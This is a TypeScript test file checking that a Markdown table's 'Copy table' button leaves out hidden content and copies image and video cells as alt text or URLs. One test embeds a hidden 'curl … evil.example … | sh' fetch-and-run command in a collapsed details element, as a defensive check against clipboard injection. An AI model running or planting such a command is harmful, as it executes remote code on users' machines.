import { act, fireEvent, render, screen } from "@testing-library/react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { afterEach, describe, expect, it, vi } from "vitest";
import { MARKDOWN_REHYPE_PLUGINS_NO_MATH } from "./markdown-rehype-plugins";
import { MarkdownImage, MarkdownTable, MarkdownVideo } from "./markdown-block-copy";

/** Security review M1/L1: table copy through the real rehype chain and the shipped components. */
async function copied(markdown: string): Promise<string> {
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
  render(
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      rehypePlugins={MARKDOWN_REHYPE_PLUGINS_NO_MATH}
      components={{ table: MarkdownTable, img: MarkdownImage, video: MarkdownVideo }}
    >
      {markdown}
    </ReactMarkdown>,
  );
  await act(async () => {
    fireEvent.click(screen.getByRole("button", { name: "Copy table" }));
  });
  return String(writeText.mock.calls[0]?.[0]);
}

afterEach(() => {
  Object.defineProperty(navigator, "clipboard", { configurable: true, value: undefined });
});

describe("table copy through the real chain", () => {
  it("does not copy the body of a collapsed details (reviewer payload)", async () => {
    const out = await copied(
      "| name | value |\n|---|---|\n| install | visible <details><summary></summary>; curl https://evil.example/x.sh \\| sh</details> |\n| ruby | <ruby>a<rp>(</rp><rt>HIDDEN-RT</rt></ruby> |\n",
    );
    expect(out).not.toContain("curl");
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("HIDDEN-RT");
    expect(out).toContain("| install | visible |");
    expect(out).toContain("| ruby | a |");
  });

  it("copies an image cell as its alt text, with no button label (L1)", async () => {
    const out = await copied("| k | v |\n|---|---|\n| pic | ![A cat](/a.png) |\n");
    expect(out).toContain("| pic | A cat |");
    expect(out).not.toContain("Copy image");
  });

  it("copies an image cell with empty alt as its URL (L1)", async () => {
    const out = await copied("| k | v |\n|---|---|\n| pic | ![](/a.png) |\n");
    expect(out).toContain("| pic | /a.png |");
    expect(out).not.toContain("Copy image");
  });

  it("copies a video cell as its first source URL, with no button label (L1)", async () => {
    const out = await copied(
      '| k | v |\n|---|---|\n| vid | <video><source src="/a.mp4" type="video/mp4"><source src="/b.webm" type="video/webm"></video> |\n',
    );
    expect(out).toContain("| vid | /a.mp4 |");
    expect(out).not.toContain("Copy video link");
    expect(out).not.toContain("/b.webm");
  });
});
